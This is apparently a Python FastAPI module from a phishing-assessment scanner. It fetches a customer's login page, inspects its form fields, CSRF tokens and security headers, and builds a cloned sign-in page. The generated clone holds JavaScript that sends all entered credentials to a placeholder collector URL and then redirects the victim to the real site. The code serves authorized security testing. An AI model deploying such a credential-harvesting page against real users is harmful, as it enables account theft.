"""landing_page_clone_test - Fetch the customer's real login page and
generate a structural HTML clone (playbook §2 #15/#17/#18).

This probe demonstrates how trivially an attacker can replicate the
customer's brand surface for a credential-harvest landing page. It is
read-only on the customer side and NEVER deploys / hosts the clone -
the cloned HTML is returned in the standard_response as a text
artifact so the customer can:

  1. See exactly how attackable their login page is (rated by detected
     form fields, hidden fields, CSRF token presence, autofill hints)
  2. Use the clone in their own authorized red-team training (the
     INFO-only finding spells out the customizations needed)

What the probe does:
  1. httpx.AsyncClient GET on options.target_url (the customer's real
     login page, e.g. https://acme.com/login)
  2. BeautifulSoup parse of the response HTML
  3. Identify the credential form (<form> with input[type=password]),
     then enumerate:
        - form action / method
        - every <input> field with type / name / id / placeholder / required
        - submit buttons + their labels
        - presence of CSRF token (name in {_csrf, csrf_token, authenticity_token, anti-forgery-token})
        - presence of subresource integrity (SRI) on external <script>
        - presence of CSP / X-Frame-Options / Permissions-Policy headers
        - autocomplete attributes (off / new-password etc.)
  4. Emit a basic clone HTML structure: same form layout, with the
     action rewritten to a placeholder %COLLECTOR_URL% and a minimal
     fetch()-based JS POST so the customer can see the credential-log
     pattern (still placeholder URL - never points anywhere live).

INFO finding with the cloned HTML + a remediation block that covers
CSP frame-ancestors, certificate transparency monitoring, and
sub-resource integrity.

Customer input via ScanRequest.options:
  - target_url    = full URL to the login page (required)
  - timeout_sec   = HTTP fetch timeout (default 15, hard cap 45)
"""
from __future__ import annotations
import re
from typing import Optional
from urllib.parse import urlparse

from fastapi import APIRouter, Depends

from tools._shared import ScanRequest, verify_scan_quota
from tools._framework import ScanContext, run_scanner
from tools._payloads.landing_page_clone_test_findings import (
    LANDING_PAGE_CLONE_TEST_FINDING_RULES,
)

router = APIRouter()


class LandingPageRequest(ScanRequest):
    options: Optional[dict] = None


_CSRF_TOKEN_NAMES = {
    "_csrf", "csrf_token", "csrf-token", "authenticity_token",
    "anti-forgery-token", "anti-forgery", "__requestverificationtoken",
    "x-csrf-token", "_token", "csrfmiddlewaretoken",
}


def _pick_password_form(soup) -> Optional[object]:
    """Return the <form> that contains an input[type=password], or the
    first form if none have a password field (still informative)."""
    forms = list(soup.find_all("form"))
    for f in forms:
        if f.find("input", {"type": "password"}):
            return f
    return forms[0] if forms else None


def _enumerate_inputs(form) -> list[dict]:
    out = []
    for el in form.find_all(["input", "select", "textarea"]):
        attrs = {k.lower(): (v if isinstance(v, str) else " ".join(v))
                 for k, v in el.attrs.items()}
        out.append({
            "tag":          el.name,
            "type":         attrs.get("type", ""),
            "name":         attrs.get("name", ""),
            "id":           attrs.get("id", ""),
            "placeholder":  attrs.get("placeholder", ""),
            "autocomplete": attrs.get("autocomplete", ""),
            "required":     "required" in attrs,
            "hidden":       attrs.get("type", "").lower() == "hidden",
            "value_preview": (attrs.get("value", "") or "")[:60],
        })
    return out


def _detect_csrf(inputs: list[dict]) -> dict:
    for i in inputs:
        nm = (i.get("name") or "").lower()
        if not nm:
            continue
        if nm in _CSRF_TOKEN_NAMES:
            return {"present": True, "name": nm, "hidden": i.get("hidden", False)}
        # Length-based heuristic: hidden inputs with long base64-ish
        # values are almost certainly CSRF / session tokens
        if i.get("hidden") and len(i.get("value_preview") or "") >= 24:
            return {"present": True, "name": nm or "(unnamed)", "hidden": True,
                    "heuristic": True}
    return {"present": False}


def _detect_sri(soup) -> dict:
    scripts = soup.find_all("script", src=True)
    if not scripts:
        return {"external_scripts": 0, "with_sri": 0, "ratio": 1.0}
    with_sri = sum(1 for s in scripts if s.get("integrity"))
    return {
        "external_scripts": len(scripts),
        "with_sri":         with_sri,
        "ratio":            round(with_sri / len(scripts), 2),
    }


def _detect_security_headers(headers) -> dict:
    """Pick the security-relevant headers (lowercase keys)."""
    keys = [
        "content-security-policy",
        "content-security-policy-report-only",
        "x-frame-options",
        "permissions-policy",
        "strict-transport-security",
        "referrer-policy",
        "cross-origin-opener-policy",
        "cross-origin-embedder-policy",
    ]
    out: dict = {}
    for k in keys:
        try:
            v = headers.get(k)
        except Exception:
            v = None
        if v:
            out[k] = v[:200]
    return out


def _detect_frame_ancestors(csp: str) -> Optional[str]:
    """Return the frame-ancestors source list if present, else None."""
    if not csp:
        return None
    m = re.search(r"frame-ancestors\s+([^;]+)", csp, re.IGNORECASE)
    if not m:
        return None
    return m.group(1).strip()


def _build_clone_html(form_action_abs: str, method: str,
                      inputs: list[dict], origin: str) -> str:
    """Return a customer-safe HTML clone structure. The form action
    points at %COLLECTOR_URL% (a placeholder), so the artifact does
    NOTHING if shipped without customization. The included JS just
    demonstrates the fetch()-POST pattern."""
    # Build visible form fields preserving the same names/types so a
    # screenshot reads as identical to the customer's original.
    rows = []
    for i in inputs:
        if i.get("hidden"):
            rows.append(
                f'<input type="hidden" name="{i.get("name", "")}" '
                f'value="">'
            )
            continue
        if i["tag"] == "select":
            rows.append(
                f'<label>{i.get("placeholder") or i.get("name", "")}</label>'
                f'<select name="{i.get("name", "")}" '
                f'{"required" if i.get("required") else ""}></select>'
            )
            continue
        if i["tag"] == "textarea":
            rows.append(
                f'<label>{i.get("placeholder") or i.get("name", "")}</label>'
                f'<textarea name="{i.get("name", "")}" '
                f'{"required" if i.get("required") else ""}></textarea>'
            )
            continue
        t = (i.get("type") or "text").lower()
        placeholder = (i.get("placeholder") or i.get("name") or t).strip()
        rows.append(
            f'<label>{placeholder}</label>'
            f'<input type="{t}" name="{i.get("name", "")}" '
            f'placeholder="{placeholder}" '
            f'autocomplete="{i.get("autocomplete") or "off"}" '
            f'{"required" if i.get("required") else ""}>'
        )
    rows_html = "\n  ".join(rows)
    method = (method or "POST").upper()
    html = f"""<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<title>Sign in (clone artifact)</title>
<style>
  body {{ font-family: Segoe UI, Arial, sans-serif; background:#fafafa; }}
  .card {{ max-width: 360px; margin: 80px auto; padding: 24px;
           background:#fff; border:1px solid #ddd; border-radius:6px; }}
  label {{ display:block; font-size:13px; color:#333; margin-top:12px; }}
  input, select, textarea {{ width:100%; padding:8px; font-size:14px;
                             border:1px solid #ccc; border-radius:4px; }}
  button {{ margin-top:18px; width:100%; padding:10px; font-size:14px;
            background:#0078d4; color:#fff; border:0; border-radius:4px; }}
</style>
</head><body>
<div class="card">
  <h2>Sign in</h2>
  <p style="font-size:12px;color:#888;">(impersonating {origin})</p>
  <form id="loginForm" method="{method}" action="%COLLECTOR_URL%">
  {rows_html}
  <button type="submit">Sign in</button>
  </form>
</div>
<script>
// CUSTOMIZE-BEFORE-USE: replace %COLLECTOR_URL% with your authorized
// red-team collector endpoint. This script simply forwards the form
// payload as a JSON POST so you can shape the receiver however you
// like (logger, GoPhish webhook, etc.).
document.getElementById('loginForm').addEventListener('submit', function(ev) {{
  ev.preventDefault();
  var fd = new FormData(this);
  var obj = {{}};
  fd.forEach(function(v, k) {{ obj[k] = v; }});
  fetch('%COLLECTOR_URL%', {{
    method: '{method}',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify(obj),
    keepalive: true
  }}).finally(function() {{
    // After logging, optionally redirect the victim to the real page
    // so the "incorrect password" experience feels normal:
    window.location = '{form_action_abs or origin}';
  }});
}});
</script>
</body></html>
"""
    return html


def _abs_action(action: str, base_url: str) -> str:
    if not action:
        return base_url
    if action.startswith(("http://", "https://", "//")):
        return action
    # Relative — strip the path off base_url and join
    p = urlparse(base_url)
    origin = f"{p.scheme}://{p.netloc}"
    if action.startswith("/"):
        return origin + action
    return base_url.rsplit("/", 1)[0] + "/" + action


async def gather(ctx: ScanContext):
    target_domain = (ctx.host or "").strip()
    if not target_domain:
        ctx.source("no-target")
        return

    opts = ctx.state.get("_options") or {}
    url = (opts.get("target_url") or "").strip()
    if not url:
        ctx.state["clone_input_missing"] = True
        ctx.source("no target_url in options")
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    try:
        timeout = min(max(int(opts.get("timeout_sec") or 15), 5), 45)
    except (TypeError, ValueError):
        timeout = 15

    try:
        import httpx
    except ImportError:
        ctx.state["clone_error"] = "httpx not installed (pip install httpx)"
        ctx.source("httpx missing")
        return
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        ctx.state["clone_error"] = (
            "beautifulsoup4 not installed (pip install beautifulsoup4)"
        )
        ctx.source("bs4 missing")
        return

    try:
        async with httpx.AsyncClient(
            verify=False, timeout=timeout, follow_redirects=True,
            headers={
                "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                               "AppleWebKit/537.36 (KHTML, like Gecko) "
                               "Chrome/120.0.0.0 Safari/537.36"),
                "Accept": "text/html,application/xhtml+xml,*/*",
            },
        ) as client:
            r = await client.get(url)
    except Exception as e:
        ctx.state["clone_error"] = f"fetch failed: {type(e).__name__}: {str(e)[:120]}"
        ctx.source("fetch failed")
        return

    html = r.text or ""
    ctx.state["clone_target_url"]   = str(r.url)
    ctx.state["clone_http_status"]  = r.status_code
    ctx.state["clone_html_byte_len"] = len(html.encode("utf-8"))

    soup = BeautifulSoup(html, "html.parser")
    form = _pick_password_form(soup)
    if not form:
        ctx.state["clone_no_form"] = True
        ctx.source(f"GET {url} -> {r.status_code}; no <form> found")
        # Still record security headers
        ctx.state["clone_security_headers"] = _detect_security_headers(r.headers)
        return

    method = (form.get("method") or "POST")
    action = form.get("action") or ""
    abs_action = _abs_action(action, str(r.url))
    inputs = _enumerate_inputs(form)
    csrf = _detect_csrf(inputs)
    sri = _detect_sri(soup)
    sec_headers = _detect_security_headers(r.headers)
    csp_string = sec_headers.get("content-security-policy") or ""
    frame_ancestors = _detect_frame_ancestors(csp_string)

    parsed = urlparse(str(r.url))
    origin = f"{parsed.scheme}://{parsed.netloc}"

    clone_html = _build_clone_html(abs_action, method, inputs, origin)

    ctx.state["clone_form_method"] = method
    ctx.state["clone_form_action"] = abs_action
    ctx.state["clone_fields"] = inputs
    ctx.state["clone_field_count"] = len(inputs)
    ctx.state["clone_csrf"] = csrf
    ctx.state["clone_sri"] = sri
    ctx.state["clone_security_headers"] = sec_headers
    ctx.state["clone_frame_ancestors"] = frame_ancestors
    ctx.state["clone_html"] = clone_html
    ctx.state["clone_html_byte_len_out"] = len(clone_html.encode("utf-8"))

    # Quick attackability score (purely informational): more fields +
    # less CSRF + less SRI = more attackable
    score = 0
    score += min(len(inputs), 10)
    if not csrf.get("present"): score += 4
    if (sri.get("ratio") or 0) < 0.5: score += 2
    if not frame_ancestors: score += 3
    if not sec_headers.get("strict-transport-security"): score += 1
    ctx.state["clone_attackability_score"] = score

    ctx.source(
        f"GET {url} -> {r.status_code}; form action={action!r} "
        f"({len(inputs)} fields, CSRF={'yes' if csrf.get('present') else 'no'}); "
        f"clone size={len(clone_html)}B"
    )


INTEL_FIELDS = [
    ("Target login URL",        "clone_target_url"),
    ("HTTP status",             "clone_http_status"),
    ("Form method",             "clone_form_method"),
    ("Form action (absolute)",  "clone_form_action"),
    ("Field count",             "clone_field_count"),
    ("Form fields",             "clone_fields"),
    ("CSRF token detected",     "clone_csrf"),
    ("Subresource integrity",   "clone_sri"),
    ("Security headers",        "clone_security_headers"),
    ("CSP frame-ancestors",     "clone_frame_ancestors"),
    ("Attackability score",     "clone_attackability_score"),
    ("Source HTML size",        "clone_html_byte_len"),
    ("Clone HTML size",         "clone_html_byte_len_out"),
    ("Cloned page HTML",        "clone_html"),
]


@router.post("/api/phishing/landing_page_clone_test")
async def phishing_landing_page_clone_test(req: LandingPageRequest,
                                            _=Depends(verify_scan_quota)):
    options = req.options or {}

    async def _gather_with_options(ctx: ScanContext):
        ctx.state["_options"] = options
        await gather(ctx)

    return await run_scanner(
        host=req.target,
        tool="landing_page_clone_test",
        gather_func=_gather_with_options,
        finding_rules=LANDING_PAGE_CLONE_TEST_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
        flat_field_keys=[],
    )


def register(app):
    app.include_router(router)
